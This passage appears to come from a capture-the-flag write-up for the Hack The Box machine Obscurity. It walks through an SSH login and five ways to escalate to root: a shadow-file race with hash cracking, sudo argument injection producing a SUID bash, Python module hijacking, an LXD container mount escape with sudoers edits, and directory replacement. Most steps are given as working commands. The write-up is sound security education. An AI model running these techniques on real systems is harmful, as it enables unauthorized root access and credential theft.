>>> ''.join([chr(ord(c)-ord(k)) for c,k in zip(cipher2, key)])
'SecThruObsFTW\n'

```

### Shell over SSH

With robert’s password, I can get an SSH shell:

```

root@kali# ssh robert@10.10.10.168
The authenticity of host '10.10.10.168 (10.10.10.168)' can't be established.
ECDSA key fingerprint is SHA256:H6t3x5IXxyijmFEZ2NVZbIZHWZJZ0d1IDDj3OnABJDw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.168' (ECDSA) to the list of known hosts.
robert@10.10.10.168's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Dec  1 19:34:50 UTC 2019

  System load:  0.0               Processes:             109
  Usage of /:   45.6% of 9.78GB   Users logged in:       0
  Memory usage: 8%                IP address for ens160: 10.10.10.168
  Swap usage:   0%

40 packages can be updated.
0 updates are security updates.

Last login: Tue Nov 26 16:05:36 2019 from 10.10.14.4
robert@obscure:~$

```

And grad `user.txt`:

```

robert@obscure:~$ cat user.txt
e4493782************************

```

## Priv: robert –> root

### Enumeration

Now as robert I can access the `BetterSSH` directory to find `BetterSSH.py`:

```

robert@obscure:~/BetterSSH$ ls -l
total 4
-rwxr-xr-x 1 root root 1805 Oct  5  2019 BetterSSH.py

```

robert can’t edit this file, as it’s owned by and only editable by root. robert can run it with `sudo`:

```

robert@obscure:~/BetterSSH$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py

```

### Source Analysis

I do have the source here as well:

```

import sys
import random, string
import os
import time
import crypt
import traceback
import subprocess

path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
session = {"user": "", "authenticated": 0}
try:
    session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break

    if salt == "":
        print("Invalid user")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    salt = '$6$'+salt+'$'
    realPass = salt + realPass

    hash = crypt.crypt(passW, salt)

    if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
except Exception as e:
    traceback.print_exc()
    sys.exit(0)

if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        o,e = proc.communicate()
        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')

```

This script:
- Creates a random path name.
- Reads a username and password from the user.
- Reads `/etc/shadow`, pulls out lines that contain `$`, and writes it to `/tmp/SSH/[random path]`.
- Sleep for .1 second.
- Loops over each row from the trimmed `shadow` file, and checks each hash against the hash of the input password. On success, it sets `session['authenticated'] = 1`. On failure, it removes the temp `shadow` file and exits.
- Removes the temp `shadow` file.
- Enters an infinite loop of reading a command, executing it and displaying results.

### Run BetterSSH

Running `BetterSSH` actually results in an error because on clean reset the `/tmp/SSH` directory doesn’t exist:

```

robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: SecThruObsFTW
Traceback (most recent call last):
  File "/home/robert/BetterSSH/BetterSSH.py", line 24, in <module>
    with open('/tmp/SSH/'+path, 'w') as f:
FileNotFoundError: [Errno 2] No such file or directory: '/tmp/SSH/Szk9OZU8'

```

I’ll create that directory, and then I can auth as robert and run commands as robert (which isn’t exciting since I am already robert):

```

robert@obscure:~$ mkdir /tmp/SSH
robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: SecThruObsFTW
Authed!
robert@Obscure:~$ id  
Output: uid=1000(robert) gid=1000(robert) groups=1000(robert),4(adm),24(cdrom),30(dip),46(plugdev)

robert@Obscure:~$ exit
Output: 
Error: sudo: exit: command not found

robert@Obscure:~$ ^CTraceback (most recent call last):
  File "/home/robert/BetterSSH/BetterSSH.py", line 57, in <module>
    command = input(session['user'] + "@Obscure$ ")
KeyboardInterrupt

```

If I fail auth, I’m dropped out:

```

robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: root
Enter password: root
Incorrect pass

```

### Path 1: shadow Race Condition

What I believe is the intended path here is to take advantage of the fact that the script writes a copy of the `shadow` file to disk, sleeps and does other work, and then deletes it. That means there’s a time in which I can read it if the permissions aren’t set right.

I’ll run to constantly be trying to copy whatever is in `/tmp/SSH` to `/dev/shm`:

```

robert@obscure:~$ while true; do cp -R /tmp/SSH/* /dev/shm/ 2>/dev/null; done

```

I’ll SSH in to get another terminal as robert and run `BetterSSH.py`​, and afterwards, there’s a file in `/dev/shm/SSH/`:

```

robert@obscure:/dev/shm$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: 
Enter password: 
Invalid user
robert@obscure:/dev/shm$ ls
PMcu46FZ

```

In the file, there’s hashes (and a lot of extra whitespace):

```

robert@obscure:/dev/shm$ cat PMcu46FZ 
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7

robert
$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
18163
0
99999
7

```

I can crack that easily in `hashcat`:

```

root@kali# hashcat -m 1800 -a 0 -o root.cracked shadow /usr/share/wordlists/rockyou.txt --force
...[snip]...
root@kali# cat root.cracked 
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:mercedes

```

Now I can `su` and get a root shell:

```

robert@obscure:/dev/shm$ su -
Password: 
root@obscure:~#

```

And get `root.txt`:

```

root@obscure:~# cat root.txt
512fd442************************

```

### Path 2: Inject into sudo

Looking more closely at what happens when auth is successful, it enters this loop:

```

while True:
    command = input(session['user'] + "@Obscure$ ")
    cmd = ['sudo', '-u',  session['user']]
    cmd.extend(command.split(" "))
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    o,e = proc.communicate()
    print('Output: ' + o.decode('ascii'))
    print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')

```

The string passed to `subprocess.Popen` is `sudo -u [user] [user input]`. The trick here is to pass a second `-u root` before the rest of the command. To demonstrate, my local kali host has a user, df:

```

root@kali# sudo -u df id
uid=1000(df) gid=1000(df) groups=1000(df),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),132(scanner)
root@kali# sudo -u df -u root id
uid=0(root) gid=0(root) groups=0(root)

```

So, I’ll run the program normally, auth as robert, but then use it to read `root.txt`:

```

robert@obscure:/dev/shm$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: SecThruObsFTW
Authed!
robert@Obscure$ -u root cat /root/root.txt
Output: 512fd442************************

```

I could easily get a shell from here. For example, I can make a SUID `bash`:

```

robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: SecThruObsFTW
Authed!
robert@Obscure$ -u root cp /bin/bash /tmp/.0xdf
Output: 

robert@Obscure$ -u root chmod 4755 /tmp/.0xdf
Output: 

robert@Obscure$ ^CTraceback (most recent call last):
  File "/home/robert/BetterSSH/BetterSSH.py", line 57, in <module>
    command = input(session['user'] + "@Obscure$ ")
KeyboardInterrupt

```

Now run it with `-p` to keep priv:

```

robert@obscure:/tmp$ ./.0xdf -p
.0xdf-4.4# id
uid=1000(robert) gid=1000(robert) euid=0(root) groups=1000(robert),4(adm),24(cdrom),30(dip),46(plugdev)

```

### Patched Path 3: PATH Hijack

At the time of release, the `BetterSSH` directory was writable by robert:

```

robert@obscure:~$ ls -ld BetterSSH/
drwxrwxrwx 2 root root 4096 Dec  2 09:47 BetterSSH/

```

Python always tries to load libraries from the directory containing the main file first, before checking the Python directories. So if I create a `subprocess.py` in that directory that is just a shell, I can then run `BetterSSH` and get a root shell:

```

robert@obscure:~/BetterSSH$ echo 'import os; os.system("/bin/bash")' > subprocess.py
robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
root@obscure:~/BetterSSH# id
uid=0(root) gid=0(root) groups=0(root)

```

This was patched at some point between December 2019 and now (hopefully someday HTB will keep a [public patch log](https://www.hackthebox.eu/home/ideas/167?page=1)) by removing write permissions from the `BetterSSH` directory for non-root users.

### Patched Path 4: lxd

At the time of release, robert was in the lxd group:

```

robert@obscure:~$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)

```

There’s a privesc here that I showed (in poor detail) as a patched privesc on [Mischief](/2019/01/05/htb-mischief.html#option-3---lxc-patched). I’ll do a more complete job here.

The idea is to create a container on the system, then load it with the root of the file system mounted into the container. Because I have root in the container, I have root access to the entire host file system.

I’ll check if there are any containers on the system already, but there are none:

```

robert@obscure:~$ lxc image list
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+

```

On a network connected box, I could just pull one in building it. I’ll need to upload something. The smallest option I know of is [LXD Alpine Linux image builder](https://github.com/saghul/lxd-alpine-builder). I’ll `git clone` it into `/opt` on my local machine, go into the direction, and run the builder:

```

root@kali:/opt/lxd-alpine-builder# ./build-alpine
Determining the latest release... v3.11
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.11/main/x86_64
Downloading alpine-mirrors-3.5.10-r0.apk 
...[snip]...
(1/19) Installing musl (1.1.24-r2)
(2/19) Installing busybox (1.31.1-r9)
Executing busybox-1.31.1-r9.post-install
(3/19) Installing alpine-baselayout (3.2.0-r3)
Executing alpine-baselayout-3.2.0-r3.pre-install
Executing alpine-baselayout-3.2.0-r3.post-install
(4/19) Installing openrc (0.42.1-r2)
Executing openrc-0.42.1-r2.post-install
(5/19) Installing alpine-conf (3.8.3-r6)
(6/19) Installing libcrypto1.1 (1.1.1g-r0)
(7/19) Installing libssl1.1 (1.1.1g-r0)
(8/19) Installing ca-certificates-cacert (20191127-r1)
(9/19) Installing libtls-standalone (2.9.1-r0)
(10/19) Installing ssl_client (1.31.1-r9)
(11/19) Installing zlib (1.2.11-r3)
(12/19) Installing apk-tools (2.10.5-r0)
(13/19) Installing busybox-suid (1.31.1-r9)
(14/19) Installing busybox-initscripts (3.2-r2)
Executing busybox-initscripts-3.2-r2.post-install
(15/19) Installing scanelf (1.2.4-r0)
(16/19) Installing musl-utils (1.1.24-r2)
(17/19) Installing libc-utils (0.7.2-r0)
(18/19) Installing alpine-keys (2.1-r2)
(19/19) Installing alpine-base (3.11.6-r0)
Executing busybox-1.31.1-r9.trigger
OK: 8 MiB in 19 packages

```

This results in a `.tar.gz` file:

```

root@kali:/opt/lxd-alpine-builder# ls
alpine-v3.11-x86_64-20200505_1324.tar.gz  build-alpine  LICENSE  README.md

```

Now `scp` that to Obscurity:

```

root@kali# sshpass -p SecThruObsFTW scp /opt/lxd-alpine-builder/alpine-v3.11-x86_64-20200505_1324.tar.gz robert@10.10.10.168:/tmp/

```

Now, back on Obscurity, I’ll import the image:

```

robert@obscure:~$ lxc image import /tmp/alpine-v3.11-x86_64-20200505_1324.tar.gz --alias 0xdf-image
Image imported with fingerprint: 75ba5f4ed31cecabcadbea321745eae02775b612a1993a2ee53146e0e32ce77d
robert@obscure:~$ lxc image list
+------------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|   ALIAS    | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+------------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| 0xdf-image | 75ba5f4ed31c | no     | alpine v3.11 (20200505_13:24) | x86_64 | 3.09MB | May 5, 2020 at 5:28pm (UTC) |
+------------+--------------+--------+-------------------------------+--------+--------+-----------------------------+

```

I can try to start the image now, but there’s an error about no storage pools:

```

robert@obscure:~$ lxc init 0xdf-image container-0xdf -c security.privileged=true
Creating container-0xdf
Error: No storage pool found. Please create a new storage pool

```

To fix this, run `lxd init` (and accept all the defaults):

```

robert@obscure:~$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]: 
Create a new BTRFS pool? (yes/no) [default=yes]: 
Would you like to use an existing block device? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=15GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like LXD to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:

```

Now, I’ll start the image again. The options breaks down to:
- `init` - action to take, starting a container
- `0xdf-image` - the image to start
- `container-0xdf` - the alias for the running container
- `-c security.privileged=true` - by default, containers run as a non-root UID; this runs the container as root, giving it access to the host filesystem as root

```

robert@obscure:~$ lxc init 0xdf-image container-0xdf -c security.privileged=true
Creating container-0xdf

```

Now, I’ll add the local system root to the container, mapped as `/mnt/root`:

```

robert@obscure:~$ lxc config device add container-0xdf device-0xdf disk source=/ path=/mnt/root
Device device-0xdf added to container-0xdf

```

Now the container is setup and ready, just not running:

```

robert@obscure:~$ lxc list
+----------------+---------+------+------+------------+-----------+
|      NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+----------------+---------+------+------+------------+-----------+
| container-0xdf | STOPPED |      |      | PERSISTENT | 0         |
+----------------+---------+------+------+------------+-----------+

```

I’ll start the container:

```

robert@obscure:~$ lxc start container-0xdf 
robert@obscure:~$ lxc list 
+----------------+---------+---------------------+----------------------------------------------+------------+-----------+
|      NAME      |  STATE  |        IPV4         |                     IPV6                     |    TYPE    | SNAPSHOTS |
+----------------+---------+---------------------+----------------------------------------------+------------+-----------+
| container-0xdf | RUNNING | 10.245.20.75 (eth0) | fd42:d14:134e:59b3:216:3eff:fe48:a2e2 (eth0) | PERSISTENT | 0         |
+----------------+---------+---------------------+----------------------------------------------+------------+-----------+

```

Now I’ll get a shell inside the container:

```

robert@obscure:~$ lxc exec container-0xdf /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # hostname 
container-0xdf

```

The host root file system is at `/mnt/root`:

```

/mnt/root # ls
bin             cdrom           etc             initrd.img      lib             lost+found      mnt             proc            run             snap            swap.img        tmp             var             vmlinuz.old
boot            dev             home            initrd.img.old  lib64           media           opt             root            sbin            srv             sys             usr             vmlinuz

```

I can read `root.txt`:

```

/mnt/root/root # cat root.txt
512fd442************************

```

There are many ways to turn this into a root shell on the host. For example, I can edit `/etc/sudoers` to add a second line for robert. I will need to `chmod +w sudoers` first (and ideally `chmod -w sudoers` once I’m done), as it’s currently set to not writable, even by owner.

```

robert ALL=(ALL) NOPASSWD:/usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
robert ALL=(ALL) NOPASSWD:/bin/bash 

```

Now I can exit the container, and run `sudo bash`:

```

/mnt/root/etc # exit
robert@obscure:~$ sudo /bin/bash
root@obscure:~# id
uid=0(root) gid=0(root) groups=0(root)

```

This was patched at some (unknown) point since December 2019 by removing the robert user from the lxd group.

### Path 5: Move BetterSSH Directory

When I originally posted this writeup, [jkr](https://twitter.com/ATeamJKR) replied:

> Four ways to root and yet there is a fifth one: Move the BetterSSH folder out of the way and create your own BetterSSH directory with a proper script 🤪
>
> — jkr (@ATeamJKR) [May 9, 2020](https://twitter.com/ATeamJKR/status/1259143066868420609?ref_src=twsrc%5Etfw)

I took a quick look, and it’s a good lesson on Linux permissions.

There are two sets of permissions that matter here. The home directory of robert, `/home/robert`, and the permissions on the directory `BetterSSH` in that directory:

```

robert@obscure:/home$ ls -ld robert/
drwxr-xr-x 8 robert robert 4096 May  9 18:47 robert/

robert@obscure:~$ ls -ld BetterSSH
drwxrwxr-x 2 robert robert 4096 May  9 18:47 BetterSSH

```

To delete a directory, I have to either empty it and run `rmdir`, or run `rm -rf` on it. Both of these require my getting access to the files in the directory, which I do no have (they are owned by root). However, to rename directory A within directory B, all that matters is the permissions of the directory B, specifically that I have write (`w`) permissions (and enter permissions (`x`)). But in this case, as robert, I have `rwx`.

In practice, if I try to remove the directory, it fails:

```

robert@obscure:~$ rm -rf BetterSSH/
rm: cannot remove 'BetterSSH/BetterSSH.py': Permission denied

```

If I just move it, it works fine:

```

robert@obscure:~$ mv BetterSSH{,-old}
robert@obscure:~$ ls
BetterSSH-old  check.txt  out.txt  passwordreminder.txt  SuperSecureCrypt.py  user.txt

```

I used one of my favorite command line shortcuts, where `BetterSSH{,-old}` is the same as `BetterSSH BetterSSH-old`.

Now I can create a new `BetterSSH` directory, and put my own `BetterSSH.py` script into it:

```

robert@obscure:~$ mkdir BetterSSH
robert@obscure:~$ echo -e '#!/usr/bin/env python3\n\nimport pty\n\npty.spawn("bash")'
#!/usr/bin/env python3

import pty

pty.spawn("bash")
robert@obscure:~$ echo -e '#!/usr/bin/env python3\n\nimport pty\n\npty.spawn("bash")' > BetterSSH/BetterSSH.py 

```

Now I can run with `sudo` and get a root shell:

```

robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
root@obscure:~# 

```